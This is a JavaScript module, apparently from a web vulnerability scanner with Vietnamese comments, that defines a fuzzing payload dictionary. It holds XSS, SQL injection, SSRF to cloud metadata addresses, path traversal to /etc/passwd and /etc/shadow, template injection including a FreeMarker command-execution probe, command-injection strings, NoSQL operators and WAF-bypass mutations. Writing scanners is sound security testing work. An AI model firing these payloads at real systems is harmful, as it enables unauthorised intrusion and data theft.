// engine/scanner/payload-engine.js
// ── Thư viện payload mở rộng với SSRF, Path Traversal, SSTI, NoSQLi, Cmd Injection

const PAYLOAD_DICTIONARY = {

  // ── XSS (tham số dạng text) ──────────────────────────────────────────────
  text: [
    "<script>alert('SNTL')</script>",
    "\"><script>alert('SNTL')</script>",
    "<img src=x onerror=alert('SNTL')>",
    "javascript:alert('SNTL')",
    "'-alert('SNTL')-'",
    // Polyglot (vượt qua nhiều WAF đơn giản)
    "'><img/src=x onerror=alert`SNTL`>",
    // DOM-based
    "#<script>alert('SNTL')</script>",
    // SVG
    "<svg onload=alert('SNTL')>",
  ],

  // ── SQL Injection (tham số dạng số) ──────────────────────────────────────
  number: [
    "' OR 1=1--",
    "' AND 1=0--",
    "' OR SLEEP(3)--",            // MySQL time-based
    "'; WAITFOR DELAY '0:0:3'--", // MSSQL time-based
    "1 AND SLEEP(3)",
    "-1 OR 1=1",
    "' OR '1'='1",
    "1; SELECT 1,2,3--",
    "' UNION SELECT NULL,NULL,NULL--",
    // PostgreSQL
    "'; SELECT pg_sleep(3)--",
  ],

  // ── Open Redirect + SSRF (tham số dạng URL) ──────────────────────────────
  url: [
    // Open Redirect
    "https://evil.example.com",
    "//evil.example.com",
    "\\/evil.example.com",
    "https://google.com%2F..",
    // SSRF — metadata cloud
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/", // Alibaba Cloud
    // SSRF — tài nguyên nội bộ
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    // SSRF encoded
    "http://0177.0000.0000.0001",  // 127.0.0.1 octal
    "http://2130706433",           // 127.0.0.1 decimal
  ],

  // ── Path Traversal (tham số dạng file/path) ──────────────────────────────
  path: [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../web.config",
    "../../../boot.ini",
    // Traversal đã URL-encode
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd", // double encoded
    // Bypass bằng null byte
    "../../../../etc/passwd%00",
    // Windows
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  ],

  // ── Server-Side Template Injection (tham số giống template) ──────────────
  //
  // FIX (vấn đề C): Các payload cũ dùng "7*7" → check kết quả "49".
  // "49" xuất hiện rất phổ biến trong HTML thực (pagination, giá tiền, version...)
  // → false positive cao khi fuzzer test paramType='text'.
  //
  // Giải pháp: dùng "7777*7777" → kết quả "60481729".
  // Con số 60481729 gần như không bao giờ xuất hiện trong HTML thực tế.
  // isSsti() trong analyzer.js được cập nhật tương ứng để check "60481729".
  //
  // Giữ lại payload Jinja2 "7*'7'" → "7777777" vì cũng rất đặc trưng.
  template: [
    // Canary-based: 7777*7777=60481729 — kết quả hiếm, ít false positive
    "{{7777*7777}}",
    "${7777*7777}",
    "<%=7777*7777%>",
    "#{7777*7777}",
    // Jinja2 / Twig specific: "7*'7'" → "7777777" (lặp chuỗi)
    "{{7*'7'}}",
    "{{config}}",
    // Velocity
    "#set($x=7777*7777)${x}",
    // FreeMarker — payload dò RCE (phát hiện qua CMD_OUTPUT_RE trong analyzer)
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
  ],

  // ── Command Injection (tham số kiểu cmd/exec) ─────────────────────────────
  cmd: [
    "; ls",
    "| id",
    "` id `",
    "$(id)",
    "; cat /etc/passwd",
    "& dir",
    "|| id",
    "\n/usr/bin/id\n",
    // Windows
    "& whoami",
    "; whoami",
  ],

  // ── NoSQL Injection (JSON-body, kiểu MongoDB) ─────────────────────────────
  nosql: [
    '{"$gt":""}',
    '{"$ne":null}',
    '{"$regex":".*"}',
    '{"$where":"this.username==this.username"}',
  ],

  // ── Tham số dạng email ────────────────────────────────────────────────────
  email: [
    "test@evil.example.com",
    "admin' OR 1=1--@example.com",
  ],

  // ── Fallback ───────────────────────────────────────────────────────────────
  // Không dùng "{{7*7}}" ở đây vì paramType='unknown' cũng check SSTI,
  // mà "49" quá phổ biến → dùng canary marker thay thế.
  unknown: [
    "'",
    "\"",
    "<script>alert(1)</script>",
    "{{7777*7777}}",
    "../../../../etc/passwd",
  ],
};

/**
 * Biến thể payload để vượt qua các bộ lọc WAF đơn giản
 * - Đổi hoa/thường xen kẽ, URL encoding, double URL encoding
 */
function mutatePayload(payload) {
  const mutations = new Set([payload]);

  // Đổi hoa/thường xen kẽ
  let altCase = '';
  for (let i = 0; i < payload.length; i++) {
    altCase += (i % 2 === 0) ? payload[i].toUpperCase() : payload[i].toLowerCase();
  }
  mutations.add(altCase);

  // URL encode
  mutations.add(encodeURIComponent(payload));

  // Double URL encode
  mutations.add(encodeURIComponent(encodeURIComponent(payload)));

  return Array.from(mutations);
}

/**
 * Trả về danh sách payload theo kiểu tham số.
 * @param {string} type  - 'text' | 'number' | 'url' | 'path' | 'template' | 'cmd' | 'nosql' | 'email' | 'unknown'
 * @param {boolean} useMutations - có thêm các biến thể bypass WAF hay không
 */
function getPayloadsByType(type = 'unknown', useMutations = false) {
  const baseList = PAYLOAD_DICTIONARY[type.toLowerCase()] || PAYLOAD_DICTIONARY.unknown;
  if (!useMutations) return [...baseList];

  const out = [];
  for (const p of baseList) out.push(...mutatePayload(p));
  return out;
}

module.exports = { getPayloadsByType, mutatePayload, PAYLOAD_DICTIONARY };
